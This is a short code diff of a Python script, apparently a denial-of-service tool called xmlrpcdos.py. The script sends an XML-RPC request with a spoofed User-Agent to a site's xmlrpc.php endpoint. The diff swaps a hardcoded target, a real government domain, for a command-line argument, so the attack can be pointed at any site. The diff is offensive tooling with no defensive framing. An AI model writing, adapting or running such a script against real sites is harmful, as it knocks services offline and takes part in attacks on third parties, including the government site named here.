@@ -39,7 +39,15 @@ data = b"""<?xml version="1.0" encoding="iso-8859-1"?>
   </params>
 </methodCall>"""
 
-req = urllib.request.Request('https://jmc.gov.bd/xmlrpc.php', data=data)
+import sys
+
+if len(sys.argv) != 2:
+    print("Usage: python xmlrpcdos.py <url>")
+    sys.exit(1)
+
+target_url = sys.argv[1]
+req = urllib.request.Request(target_url, data=data)
+
 req.add_header('Accept', '*/*')
 req.add_header('User-Agent', 'Mozilla/5.0 (Wihndows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0')
 req.add_header('Connection', '')
